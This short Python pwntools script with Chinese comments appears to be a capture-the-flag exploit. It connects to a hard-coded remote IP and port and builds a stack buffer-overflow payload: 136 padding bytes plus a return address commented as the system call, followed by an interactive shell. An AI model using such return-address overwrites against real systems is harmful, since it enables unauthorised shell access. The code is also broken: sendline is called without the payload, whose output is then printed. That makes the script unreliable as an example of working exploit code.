
from pwn import *
#设置目标机的信息，用来建立远程链接，url或ip指明了主机，port设置端口
r = remote("111.200.241.244", 49320)
#设置payload，准备覆盖
r.recvline()
payload = "a" * 136
# 0x400596是systemcall的位置
payload += p64(0x400596).decode('unicode_escape')
show=r.sendline()
print(show)
r.interactive()
